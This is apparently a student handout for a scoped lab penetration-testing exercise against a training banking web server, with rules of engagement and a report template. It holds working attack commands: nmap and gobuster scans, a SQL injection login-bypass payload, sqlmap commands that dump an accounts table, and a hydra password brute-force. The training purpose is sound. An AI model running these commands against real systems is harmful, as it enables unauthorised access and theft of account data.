# Exercise 4 – Penetration Tester: Student Handout
**Role:** Penetration Tester / Red Team Operator | **Duration:** ~75 minutes
**Platform:** kali (10.10.50.10) | **Target:** web-banking (10.10.20.10)

---

## Rules of Engagement

**In-scope:** 10.10.20.0/24 (DMZ), 10.10.30.0/24 (Corp — reachable after foothold)
**Out-of-scope:** 10.10.40.0/24 (Security), 10.10.50.0/24 (Red Team — your own network)
**Prohibited:** DoS attacks, data destruction, testing against real external systems
**Required:** Document ALL findings with evidence; use threat-informed approach (MISP Event #1001)

Engagement brief: `~/pentest/engagement-brief.txt`
Report template: `~/pentest/report-template.md`

---

## Phase 1 – Reconnaissance

```bash
# Network scan
nmap -sV -sC -p- 10.10.20.0/24

# Web reconnaissance
nikto -h http://10.10.20.10
gobuster dir -u http://10.10.20.10 \
  -w /opt/SecLists/Discovery/Web-Content/common.txt
```

Document: open ports, service versions, interesting directories.

---

## Phase 2 – Exploitation: SQL Injection (T1190)

**Manual test** (browser or curl):
```
Username: ' OR '1'='1'--
Password: anything
```

**Automated confirmation:**
```bash
sqlmap -u http://10.10.20.10/login.php \
  --data="username=test&password=test" --dbs
```

**Data extraction:**
```bash
sqlmap -u http://10.10.20.10/login.php \
  --data="username=test&password=test" \
  -D bankdb -T accounts --dump --count
```

---

## Phase 3 – Credential Brute-Force (T1078)

```bash
hydra -l admin \
  -P /opt/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt \
  http-post-form \
  '10.10.20.10:/login.php:username=^USER^&password=^PASS^:Login failed'
```

After finding the admin password — log in and examine what is accessible.

---

## Phase 4 – Information Disclosure (T1083)

Check the `/backup/` directory. What files are exposed? What is the impact?

---

## Report Writing

Complete `~/pentest/report-template.md` with:
- Executive Summary (overall risk rating)
- Finding 1: SQL Injection (CRITICAL) – description, evidence, CVSS, MITRE, remediation
- Finding 2: Weak Admin Credentials (HIGH) – same structure
- Finding 3: Information Disclosure /backup/ (MEDIUM) – same structure
- Attack narrative
- TIBER-EU note (how threat intelligence guided the test)

---

## MITRE Mapping

| Finding | Technique |
|---|---|
| SQL Injection | T1190 – Exploit Public-Facing Application |
| Weak credentials | T1078 – Valid Accounts |
| Information disclosure | T1083 – File and Directory Discovery |
| Data exfiltration via web | T1005 – Data from Local System |

---

## Deliverable

Submit: completed report (via REP or as markdown file). Must include evidence screenshots or output pastes.

---

*NG-SOC LM8 Sub Case 1a | Exercise 4 | British English*
